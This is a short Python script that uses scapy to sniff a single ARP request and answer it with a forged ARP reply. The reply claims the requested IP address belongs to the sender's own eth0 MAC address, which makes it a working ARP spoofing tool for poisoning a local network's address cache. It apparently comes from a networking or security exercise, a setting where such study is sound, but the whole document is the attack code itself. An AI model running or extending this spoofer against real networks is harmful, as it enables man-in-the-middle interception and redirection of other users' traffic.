#!/usr/bin/python3
from scapy.all import *
import netifaces as ni

# Our eth0 mac address
macaddr = ni.ifaddresses('eth0')[ni.AF_LINK][0]['addr']

def handle_arp_packets(packet):
    # craft ARP response and send it 
    packet.show()
    if ARP in packet and packet[ARP].op == 1:
        ether_resp = Ether(dst=packet[Ether].src, type=0x806, src=macaddr)  
        arp_response = ARP(pdst=packet[ARP].psrc)
        arp_response.op = 2
        arp_response.plen = packet[ARP].plen
        arp_response.hwlen = packet[ARP].hwlen
        arp_response.ptype = packet[ARP].ptype
        arp_response.hwtype = packet[ARP].hwtype
        arp_response.hwsrc = macaddr
        arp_response.psrc = packet[ARP].pdst
        arp_response.hwdst = packet[ARP].hwsrc
        arp_response.pdst = packet[ARP].psrc
        response = ether_resp/arp_response
        response.show()
        sendp(response, iface="eth0")
def main():
    # We only want arp requests with opcode 1
    berkeley_packet_filter = "(arp[6:2] = 1)"
    # sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)
    
if __name__ == "__main__":
    main()